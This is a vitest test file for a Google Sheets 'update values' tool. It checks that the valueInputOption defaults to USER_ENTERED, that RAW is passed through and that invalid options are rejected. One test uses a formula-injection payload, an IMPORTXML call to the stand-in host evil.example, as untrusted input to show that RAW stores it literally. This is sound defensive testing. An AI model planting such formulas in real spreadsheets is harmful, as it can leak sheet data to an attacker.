import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("../tokenProvider", () => ({ getAccessToken: vi.fn(async () => "at") }));

import { TOOLS } from "../tools";

const tool = TOOLS.find((t) => t.name === "sheets_update_values")!;
const ctx = { env: {} as Env, sub: "s1" };
let fetchSpy: ReturnType<typeof vi.spyOn>;

beforeEach(() => {
  vi.restoreAllMocks();
  fetchSpy = vi.spyOn(globalThis, "fetch").mockResolvedValue(new Response(JSON.stringify({}), { status: 200 }));
});

/** The valueInputOption actually sent to the Sheets values.update endpoint. */
function sentOption(): string | null {
  const url = new URL(fetchSpy.mock.calls[0][0] as string);
  return url.searchParams.get("valueInputOption");
}

describe("sheets_update_values valueInputOption", () => {
  it("defaults to USER_ENTERED", async () => {
    await tool.run(ctx, tool.inputSchema.parse({ spreadsheetId: "sh1", range: "Sheet1!B2", values: [["=A1"]] }));
    expect(sentOption()).toBe("USER_ENTERED");
  });

  it("plumbs RAW through, so third-party text is written as a literal", async () => {
    await tool.run(
      ctx,
      tool.inputSchema.parse({
        spreadsheetId: "sh1",
        range: "Sheet1!B2",
        values: [["=IMPORTXML(\"https://evil.example\",\"//x\")"]],
        valueInputOption: "RAW",
      }),
    );
    expect(sentOption()).toBe("RAW");
  });

  it("rejects an unknown valueInputOption", () => {
    const parsed = tool.inputSchema.safeParse({
      spreadsheetId: "sh1",
      range: "A1",
      values: [["x"]],
      valueInputOption: "FORMULA",
    });
    expect(parsed.success).toBe(false);
  });
});
